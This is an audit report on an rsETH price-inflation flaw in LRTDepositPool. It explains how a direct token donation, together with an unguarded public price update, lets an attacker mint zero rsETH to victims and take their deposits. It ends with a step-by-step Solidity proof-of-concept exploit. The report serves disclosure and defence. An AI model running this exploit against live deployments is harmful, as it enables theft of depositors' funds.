Audit Report

## Title
rsETH Price Inflation via Direct Token Donation to `LRTDepositPool` - (File: contracts/LRTDepositPool.sol)

## Summary
`LRTDepositPool.getAssetDistributionData()` uses raw `IERC20(asset).balanceOf(address(this))` to count pool assets, allowing an attacker to inflate `rsETHPrice` by directly transferring LST tokens without calling `depositAsset()`. Because `_beforeDeposit` does not require `rsethAmountToMint > 0`, a victim depositing with `minRSETHAmountExpected = 0` has their full LST balance transferred to the pool while receiving zero rsETH, permanently losing those funds to the attacker.

## Finding Description

`getAssetDistributionData()` reads the raw ERC-20 balance of the deposit pool:

```solidity
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
``` [1](#0-0) 

This value flows through `_getTotalEthInProtocol()` into `_updateRsETHPrice()`, which computes:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
``` [2](#0-1) 

`updateRSETHPrice()` is `public` with no access control, so any caller can trigger a price update after a donation: [3](#0-2) 

The `pricePercentageLimit` guard is only active when `pricePercentageLimit > 0`. Its default storage value is `0`, so the condition `pricePercentageLimit > 0 && priceDifference > ...` evaluates to `false` and the guard is entirely bypassed at deployment: [4](#0-3) 

`getRsETHAmountToMint()` divides by the stored price, which can be made arbitrarily large:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [5](#0-4) 

`_beforeDeposit` only reverts when `rsethAmountToMint < minRSETHAmountExpected`. When `minRSETHAmountExpected = 0`, a zero-mint result passes silently: [6](#0-5) 

`depositAsset()` then executes `safeTransferFrom` before calling `_mintRsETH(0)`, so the victim's tokens are transferred to the pool and zero rsETH is minted: [7](#0-6) 

## Impact Explanation

**Critical — Direct theft of user funds.** A victim depositing with `minRSETHAmountExpected = 0` (a common default in integrations and scripts) loses their entire LST deposit to the pool while receiving zero rsETH. The attacker, holding the only outstanding rsETH, can redeem it via `LRTWithdrawalManager` and recover the original donation plus all victim deposits. The victim has no recovery path.

## Likelihood Explanation

The attack requires: (1) the attacker to hold enough LST to donate proportional to the target deposit; (2) `pricePercentageLimit == 0`, which is the default storage value at deployment; (3) at least one victim to call `depositAsset` with `minRSETHAmountExpected = 0`. Condition 3 is realistic — many protocol integrations, aggregators, and early depositors omit slippage protection. The attack is most dangerous at launch when `rsethSupply` is near zero and price is most sensitive to donations. The attack is repeatable and requires no privileged access.

## Recommendation

1. Replace raw `balanceOf` accounting with an internal deposit ledger that tracks only assets received through `depositAsset()` / `depositETH()`.
2. Add an explicit check in `_beforeDeposit` requiring `rsethAmountToMint > 0` regardless of `minRSETHAmountExpected`.
3. Ensure `pricePercentageLimit` is set to a safe non-zero value before the first public deposit, or enforce it in the initializer.
4. Consider adopting a virtual-shares offset (as in OZ ERC-4626 v4.9) to make donation attacks economically unviable.

## Proof of Concept

```solidity
// Preconditions: rsethSupply = 0, rsETHPrice = 1e18, pricePercentageLimit = 0

// Step 1 — Attacker seeds pool with 1 wei stETH to obtain 1 wei rsETH
vm.startPrank(attacker);
stETH.approve(address(lrtDepositPool), 1);
lrtDepositPool.depositAsset(address(stETH), 1, 0, "");
// rsethSupply = 1, rsETHPrice = 1e18

// Step 2 — Attacker donates X stETH directly (bypasses depositAsset)
stETH.transfer(address(lrtDepositPool), X);
// balanceOf(lrtDepositPool) = 1 + X, rsethSupply still = 1

// Step 3 — Attacker triggers price update (public, no access control)
lrtOracle.updateRSETHPrice();
// pricePercentageLimit == 0 → guard bypassed
// newRsETHPrice ≈ (1 + X) * 1e18
vm.stopPrank();

// Step 4 — Victim deposits Y stETH with no slippage protection
vm.startPrank(victim);
stETH.approve(address(lrtDepositPool), Y);
lrtDepositPool.depositAsset(address(stETH), Y, 0, "");
// rsethAmountToMint = Y * 1e18 / ((1+X)*1e18) = Y/(1+X) → 0 if X >> Y
// safeTransferFrom executes: victim loses Y stETH, receives 0 rsETH
vm.stopPrank();

// Step 5 — Attacker updates price to include victim deposit
vm.startPrank(attacker);
lrtOracle.updateRSETHPrice();
// newRsETHPrice ≈ (1 + X + Y) * 1e18

// Step 6 — Attacker initiates withdrawal of 1 wei rsETH
// expectedAssetAmount = 1 * rsETHPrice / assetPrice = 1 + X + Y stETH
// After withdrawalDelayBlocks (~8 days), attacker claims 1 + X + Y stETH
// Net profit: Y stETH (victim's full deposit)
vm.stopPrank();
```
